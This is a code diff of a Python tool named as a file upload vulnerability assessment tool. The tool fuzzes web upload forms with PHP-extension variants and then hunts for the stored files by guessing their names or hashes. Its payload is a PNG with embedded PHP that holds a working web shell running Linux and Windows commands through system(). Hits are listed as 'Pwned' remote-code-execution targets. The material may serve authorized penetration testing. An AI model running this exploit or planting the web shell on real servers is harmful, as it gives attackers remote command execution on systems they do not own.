@@ -9,13 +9,13 @@ import hashlib
 from urllib.parse import urljoin
 
 parser = argparse.ArgumentParser(description="File Upload Vulnerability Assessment Tool")
-parser.add_argument("URL", help="insert URL")
-parser.add_argument("--cookies", default='', required=False, help='insert Cookies "PHPSESSID=<cookies>, Cookies=<cookies>"')
-parser.add_argument("--proxy", "-x", default='', required=False, help="redirect trafic trought proxy <127.0.0.1:8080>")
-parser.add_argument("--csrf", default=False, required=False, action="store_true", help="csrf token")
-parser.add_argument("--upload", "-u", default=False, required=False, help="Directory where webapp stores uploaded file")
+parser.add_argument("URL", help="Target URL")
+parser.add_argument("--cookies", default='', required=False, help='Insert Cookies "PHPSESSID=<cookies>, Cookies=<cookies>"')
+parser.add_argument("--proxy", "-x", default='', required=False, help="Redirect traffic through proxy <127.0.0.1:8080>")
+parser.add_argument("--csrf", default=False, required=False, action="store_true", help="CSRF token")
+parser.add_argument("--upload", "-u", default=False, required=False, help="Directory where the web application stores uploaded files")
 parser.add_argument("-v", "--verbose", action="count", default=0, help = "Verbose mode")
-parser.add_argument("--skip-mimetype", default=False, required=False, action="store_true", help = "Skip MIME type fuzzing")
+
 args = parser.parse_args()
 
 
@@ -43,6 +43,7 @@ upload_dir = args.upload
 
 
 
+
 def regex_url(text_to_sanitize: str) -> str:
     """
     Function used to prepare the URL correctly so that it is in the following format
@@ -61,65 +62,101 @@ def regex_url(text_to_sanitize: str) -> str:
     return text_to_sanitize
 
 
-def guessing_file_name(value_to_validate: list, extension: str, fake_image: str) -> dict[str, list[str]]:
+def guessing_file_name(value_to_validate: list, extension: str, fake_image: bytes, mode: str) -> dict[str, list[str]]:
     """
     Tests only file extensions that appear to be accepted by the application.
     Generates possible filenames used by the application when storing uploaded files.
 
     This is done by:
     (1) Parsing the server response to identify declared filenames
-    (2) Hashing the uploaded file content using MD5 and SHA1 (some applications store files using hashes)
-
+    (2) Hashing the uploaded file content using MD5  (some applications store files using hashes)
+    (3) Hashing the uploaded file content using SHA1 (some applications store files using hashes)
     :param value_to_validate: difference in response body between a known valid request
                             (valid_request_values["text_body"]) and the request under test
                             (to_be_validate_request_values["text_body"]); used to identify new
                             filenames with potentially valid extensions not present in the original response
-
     :param extension: uploaded file name (e.g., "test.php")
     :param fake_image: fake image used for upload (PNG content with embedded PHP code)
+    :param mode: naming strategy used by the server to store uploaded files (e.g., "MD5", "SHA1", "Original file name", "Name in body", "TEST")
+
     :return: possible filenames used to store uploaded files
     """
 
-    list_ = [extension]
-    extension_regex = extension.split(".")[-1]  # php
-
     ### (1)
-    for word in value_to_validate:
-        match = re.search(rf"[A-Za-z0-9_-]+\.{extension_regex}$",word)  # Match only name.php not " .php" or other special characters
-        if match and match.group(0) != extension:
-            list_.append(match.group())
+    def regex(list_, value_to_validate, extension):
+        for word in value_to_validate:
+            match = re.search(rf"[A-Za-z0-9_-]+\.{extension_regex}$", word)  # Match only name.php not " .php" or other special characters
+            if match and match.group(0) != extension:
+                list_.append(match.group())
+                return list_
+        return list_
 
     ### (2)
-    md5 = hashlib.md5(fake_image).hexdigest() + '.' + extension_regex
-    sha1 = hashlib.sha1(fake_image).hexdigest() + '.' + extension_regex
-    if md5 not in list_:
-        list_.append(md5)
-    if sha1 not in list_:
-        list_.append(sha1)
+    def md5(list_, fake_image):
+        md5 = hashlib.md5(fake_image).hexdigest() + '.' + extension_regex
+        if md5 not in list_:
+            list_.append(md5)
+        return list_
 
+    ### (3)
+    def sha1(list_, fake_image):
+        sha1 = hashlib.sha1(fake_image).hexdigest() + '.' + extension_regex
+        if sha1 not in list_:
+            list_.append(sha1)
+        return list_
+
+    extension_regex = extension.split(".")[-1]  # php
+    list_ = []
+
+    if mode == "TEST":
+        list_ = [extension]
+        list_ = regex(list_, value_to_validate, extension)
+        list_ = md5(list_, fake_image)
+        list_ = sha1(list_, fake_image)
+    elif mode == "MD5":
+        list_ = md5(list_, fake_image)
+    elif mode == "SHA1":
+        list_ = sha1(list_, fake_image)
+    elif mode == "Name in body":
+        list_ = regex(list_, value_to_validate, extension)
+    elif mode == "Original file name":
+        list_ = [extension]
+
+    ### Return Value
     name_to_test = {extension: list_}
     return name_to_test
 
 
-def test_upload(upload_dir: str, name_to_test: dict, s) -> None:
+def test_upload(upload_dir: str, name_to_test: dict, Pwned: list, mode: str,  s) -> tuple[list, str]:
     """
-    #This function tests a list of candidate filenames to determine which ones are valid and tracks the naming pattern used by the application to store uploaded files (e.g., original name, response-derived name, MD5, SHA1).
+    Tests candidate filenames to determine whether uploaded files are accessible.
 
-    :param upload_dir: directory where accepted files are uploaded
-    :param name_to_test: contains all possible names with which the application might have saved the file
-    """
+    The function also identifies the naming strategy used by the application
+    to store uploaded files, such as original filename, filename extracted
+    from the response body, MD5 hash, or SHA1 hash.
 
+    :param upload_dir: directory where the web application stores uploaded files
+    :param name_to_test: dictionary mapping the tested filename to possible stored filenames
+    :param Pwned: list of uploaded file URLs where the RCE marker was detected
+    :param mode: current file naming strategy to test ("TEST", "MD5", "SHA1", "Original file name", "Name in body")
+    :param s: initialized requests session
+    :return: updated list of vulnerable uploaded file URLs and detected file naming strategy
+     """
 
-    for value in name_to_test.values():  #Identifies how images are saved on the server. If length is 3, nothing was extracted from the original response body
-        if len(value) == 3:
-            name_to_test_type = ["Original file name", "MD5", "SHA1"]
-        else:
-            name_to_test_type = ["Original file name", "Name in body", "MD5", "SHA1"]
+    if mode == "TEST":
+        for value in name_to_test.values():  #Identifies how images are saved on the server. If length is 3, nothing was extracted from the original response body
+            if len(value) == 3:
+                name_to_test_type = ["Original file name", "MD5", "SHA1"]
+            else:
+                name_to_test_type = ["Original file name", "Name in body", "MD5", "SHA1"]
+    else:
+        name_to_test_type = [mode]
 
 
     match = re.match(r"(https?://[^/]+)", URL)
     base_url = match.group(1) + "/"
     found = False
+    return_save_method = mode  # Default fallback to avoid UnboundLocalError when --upload is not used
 
     if upload_dir.startswith('/'):
         upload_dir = upload_dir.replace('/', '', 1)
@@ -133,17 +170,16 @@ def test_upload(upload_dir: str, name_to_test: dict, s) -> None:
 
             if response.status_code == 200:
                 if not found:
-                    vprint("[+] File saved using method: \"{}\"\n".format(saved_method))
+                    return_save_method = saved_method
                     found = True
 
-                vprint("file {} successfully uploaded with name: {}".format(key, value))
+                vprint("File {} successfully uploaded with name: {}".format(key, value))
 
                 if "__funchis__4005__kyra__" in response.text.lower():
-                    print("\033[34m{}\033[00m \033[33m(Pwnd!)\033[0m".format(url))
+                    Pwned.append("\033[34m{}\033[00m \033[33m(Pwned!)\033[0m".format(url))
                 break
 
-    if not found and name_to_test:
-        print("[-] Guessing Filename failed")
+    return Pwned, return_save_method
 
 
 def extract_input_form(s) -> tuple[str, str, str, dict]:
@@ -174,7 +210,6 @@ def extract_input_form(s) -> tuple[str, str, str, dict]:
             if input_test.get('type') == 'file':
                 action = tag.get('action')  # Contains the name of the PHP file that performs the upload (upload.php)
                 method = tag.get('method')
-                # img_src = soup.find('img').get('src') #Find where the image is saved
                 # Extract input data for upload name
                 name = input_test.get('name')
                 found = True
@@ -213,7 +248,7 @@ def clean_html_text(html: str) -> str:
     return "\n".join(lines)
 
 
-def ext_validator(valid_request_values: dict, to_be_validate_request_values: dict, extension: str, fake_image: str, scan_type: str) -> tuple[bool, str, dict[str, list[str]]]:
+def ext_validator(valid_request_values: dict, to_be_validate_request_values: dict, extension: str, fake_image: bytes, mode: str) -> tuple[bool, str, dict[str, list[str]]]:
     """
     Validates the file extension under test (e.g., "test.php") by comparing it against a known allowed extension (.png).
 
@@ -221,7 +256,7 @@ def ext_validator(valid_request_values: dict, to_be_validate_request_values: dic
     :param to_be_validate_request_values: dictionary containing values from the request under test ("redirect", "status_code", "text_body")
     :param extension: file name to validate (e.g., "test.php")
     :param fake_image: fake image used for upload (PNG content with embedded PHP code)
-    :param scan_type: type of scan executed
+    :param mode: naming strategy used by the server to store uploaded files (e.g., "MD5", "SHA1", "Original file name", "Name in body", "TEST")
     :return: tuple containing validation result, a message, and a dictionary of candidate values
     """
 
@@ -244,36 +279,47 @@ def ext_validator(valid_request_values: dict, to_be_validate_request_values: dic
         if any(word in deny_keywords for word in value_to_validate):
             return False, "body", {}
 
-        name_to_test = guessing_file_name(value_to_validate, extension, fake_image)
+        name_to_test = guessing_file_name(value_to_validate, extension, fake_image, mode)
         return True, "", name_to_test
 
 def extract_name_through_mimetype(mimetype: str) -> str:
-    # Implementation for extracting name through MIME type
+    """
+    Generates a test filename based on the provided MIME type.
+
+    :param mimetype: MIME type used during upload testing
+    :return: filename with the extension mapped from the MIME type
+    """
+
     mime_to_ext = {"image/jpeg": "jpg", "image/png": "png", "image/gif": "gif", "image/webp": "webp", "image/svg+xml": "svg", "image/bmp": "bmp", "image/x-icon": "ico", "application/pdf": "pdf"}
     return "test." + mime_to_ext.get(mimetype)
 
-def run_scan(s, scan_type):
+def run_scan(s: requests.Session, scan_type: str, mode: str) -> str:
     """
     Main scanning routine.
 
     Performs the following steps:
     (1) Identifies the upload form and required parameters
-    (2) Sends a baseline request using a known valid file (PNG)
-    (3) Tests multiple potentially dangerous extensions (e.g., .php variants)
+    (2) Sends a baseline request using a known valid PNG file
+    (3) Tests either MIME types or potentially dangerous file extensions
     (4) Compares responses to detect filtering mechanisms
-    (5) Collects extensions that appear to be allowed
+    (5) Collects filenames that appear to be accepted
     (6) Optionally attempts to locate uploaded files on the server
-    :param scan_type: type of scan executed
+    (7) Disables file lookup if the file naming strategy cannot be identified during MIME-TYPE scan
+
     :param s: initialized requests session
+    :param scan_type: scan mode to execute ("MIME-TYPE" or "PAYLOAD")
+    :param mode: current file naming strategy ("TEST", "MD5", "SHA1", "Original file name", "Name in body")
+    :return: detected file naming strategy, or the input mode if no strategy was identified
     """
 
 
     ### DECLARING VARIABLE
-    global valid_format
-    valid_format = []
+    global upload_dir
+    Pwned = []
     original_verbose = args.verbose
     allowed = []
     not_allowed = []
+    saved_method_param = mode  # Default fallback to avoid UnboundLocalError when --upload is not used
     valid_image = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\rIDATx\xdac\xfc\xff\x9f\xa1\x1e\x00\x07\x82\x02\x7f=\xc8H\xef\x00\x00\x00\x00IEND\xaeB`\x82'
     fake_image = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\rIDATx\xdac\xfc\xff\x9f\xa1\x1e\x00\x07\x82\x02\x7f=\xc8H\xef\x00\x00\x00\x00IEND\xaeB`\x82<html><body><h1><?php echo "__FUnchis__".(2002+2003)."__KYra__"; ?></h1><h3>Linux Backend</h3><form method="GET"><input type="TEXT" name="cmd_linux" size="80"><input type="SUBMIT" value="Execute"></form><pre><?php if(isset($_GET["cmd_linux"])){ system($_GET["cmd_linux"]." 2>&1"); } ?></pre><h3>Windows Backend</h3><form method="GET"><input type="TEXT" name="cmd_win" size="80"><input type="SUBMIT" value="Execute"></form><pre><?php if(isset($_GET["cmd_win"])){ system("cmd.exe /c ".$_GET["cmd_win"]." 2>&1"); } ?></pre></body></html>\n'
     php_payloads = {"test.php": fake_image, "test.php2": fake_image, "test.php3": fake_image, "test.php4": fake_image,
@@ -296,18 +342,18 @@ def run_scan(s, scan_type):
 
 
     #Define correct URL
-    if action == 'None' or action == '#': action = ''
+    if action is None or action == '#': action = ''
     final_url = urljoin(URL, action)
 
     #Define scan type [mime - payload]
     if scan_type == "MIME-TYPE":
         payloads = mime_payloads
-        message = "Mime-Type seems to be Allowed"
+        message = "MIME type seems to be allowed"
         args.verbose = False
 
     elif scan_type == "PAYLOAD":
         payloads = php_payloads
-        message = "Extension seems to be Allowed"
+        message = "Extension seems to be allowed"
 
 
 
@@ -332,34 +378,49 @@ def run_scan(s, scan_type):
             content_type = "image/png"
             file_name = extension  # extension = test.php, test.phar ...
 
-        vprint("Testing extension: \033[97m {}\033[00m".format(extension))
+        vprint("\nTesting extension: \033[97m {}\033[00m".format(extension))
         # PNG Magic Byte -> b'\x89PNG\r\n\x1A\n' || Minimal PNG image -> https://png-pixel.com/
         # files = {name: ('test.png', fake_image, "image/png")}
         files = {name: (file_name, value, content_type)}
         if CSRF: name, action, method, tags_array = extract_input_form(s)
         r = s.post(final_url, files=files, data=tags_array, allow_redirects=True)
         to_be_validate_request_values = {"status_code": r.status_code, "redirect": r.is_redirect, "text_body": r.text}
-        result, message_occurred, data = ext_validator(valid_request_values, to_be_validate_request_values, file_name, value, scan_type)
+        result, message_occurred, data = ext_validator(valid_request_values, to_be_validate_request_values, file_name, value, mode)
 
         if result:
-            vprint("{}\n".format(message))
-            name_to_test.update(data)
+            vprint("{}".format(message))
             allowed.append(file_name)
+
+            if upload_dir:
+                name_to_test.update(data)
+                Pwned, saved_method_param = test_upload(upload_dir, name_to_test, Pwned, mode, s)
+                name_to_test = {}
+
         else:
-            vprint("[!] Possible filter in posture, found in {} \n".format(message_occurred))
+            vprint("[!] Possible filter detected in response: {} \n".format(message_occurred))
             not_allowed.append(file_name)
 
     print("[+] Allowed: {}".format(allowed))
     vprint("[-] Not Allowed: {}\n".format(not_allowed))
 
-    if upload_dir: test_upload(upload_dir, name_to_test, s)
-
-    if scan_type == "MIME-TYPE":
-        valid_format = allowed.copy()
+    if Pwned:
+        print( "\n[!!] Uploaded files found vulnerable to RCE:")
+        for pwn in Pwned:
+            print(pwn)
 
     args.verbose = original_verbose
 
-def init_session():
+    if scan_type == "MIME-TYPE" and upload_dir:
+        if saved_method_param != "TEST":
+            print("[+] File saved using method: {}".format(saved_method_param))
+        else:
+            print("[-] Guessing Filename failed")
+            print("[*] Unable to determine file naming strategy, skipping file lookup phase")
+            upload_dir = None
+
+    return saved_method_param
+
+def init_session() -> requests.Session:
     #Initialize Session
     s = requests.session()
 
@@ -396,12 +457,13 @@ def main():
     URL = regex_url(args.URL)
     s = init_session()
 
-    if not args.skip_mimetype:
-        print("\n[*] Extracting Valid Mime-Type\n")
-        run_scan(s, "MIME-TYPE")
+    saved_method_param = "TEST"
+
+    print("\n[*] Extracting valid MIME types\n")
+    saved_method_param = run_scan(s, "MIME-TYPE", saved_method_param)
 
     print("\n[*] Starting Fuzzing ...\n")
-    run_scan(s, "PAYLOAD")
+    saved_method_param = run_scan(s, "PAYLOAD", saved_method_param)
 
 
 if __name__ == "__main__":
